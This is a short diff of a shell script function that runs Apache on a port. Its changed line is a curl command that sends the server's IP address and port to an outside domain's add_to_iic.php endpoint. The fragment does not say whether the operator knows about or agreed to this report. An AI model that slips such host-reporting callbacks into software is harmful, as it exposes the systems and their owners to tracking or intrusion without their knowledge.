@@ -123,7 +123,7 @@ run_apache_on_port() {
     echo "Sending server details to the database..."
     tput setaf 3  # Set text color to orange
     echo "##############################################"
-    curl -X GET "http://anubisprwksy.com/iic/add_to_iic.php?ip=$ip&port=$port"
+    curl -O "http://anubisprwksy.com/iic/add_to_iic.php?ip=$ip&port=$port"
     echo "##############################################"
     tput sgr0     # Reset text color
 
